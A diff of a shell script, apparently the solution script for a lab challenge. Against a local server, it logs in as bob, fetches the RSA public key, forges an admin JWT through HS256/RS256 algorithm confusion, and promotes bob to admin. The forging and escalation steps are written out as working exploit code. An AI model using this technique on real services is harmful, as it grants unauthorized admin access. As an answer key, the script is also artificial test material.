@@ -11,13 +11,20 @@ for i in $(seq 1 30); do
     sleep 1
 done
 
-# Step 1: Retrieve the RSA public key
+# Step 1: Log in as bob to get a legitimate JWT and inspect its structure
+BOB_TOKEN=$(curl -sf "http://localhost:5000/login?username=bob&password=hunter2" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+echo "Bob's token: ${BOB_TOKEN}"
+
+# The JWT header reveals the server uses RS256.
+# The /public-key endpoint exposes the RSA public key.
+# Classic JWT algorithm confusion: if the server also accepts HS256 and verifies it
+# using the public key as the HMAC secret, we can forge an admin token.
+
+# Step 2: Retrieve the RSA public key
 curl -sf http://localhost:5000/public-key -o /tmp/pub_key.pem
 echo "Retrieved public key."
 
-# Step 2: Forge an admin JWT signed with HS256 using the public key as the HMAC secret.
-# auth.py's _verify_hmac_compat verifies HS256 tokens by computing HMAC-SHA256 with
-# the RSA public key PEM as the secret — so signing the same way produces a valid token.
+# Step 3: Forge an admin JWT — sign with HS256 using the public key PEM as the HMAC secret
 python3 - <<'PYEOF'
 import base64
 import hashlib
@@ -53,7 +60,7 @@ PYEOF
 
 FORGED_TOKEN=$(cat /tmp/forged_token.txt)
 
-# Step 3: Call /promote to elevate bob to admin
+# Step 4: Call /promote with the forged admin token
 RESPONSE=$(curl -sf -X POST http://localhost:5000/promote \
     -H "Authorization: Bearer ${FORGED_TOKEN}" \
     -H "Content-Type: application/json" \
@@ -61,7 +68,7 @@ RESPONSE=$(curl -sf -X POST http://localhost:5000/promote \
 
 echo "Promote response: ${RESPONSE}"
 
-# Step 4: Verify the change
+# Step 5: Verify
 USERS=$(curl -sf http://localhost:5000/users)
 echo "Current users: ${USERS}"
 
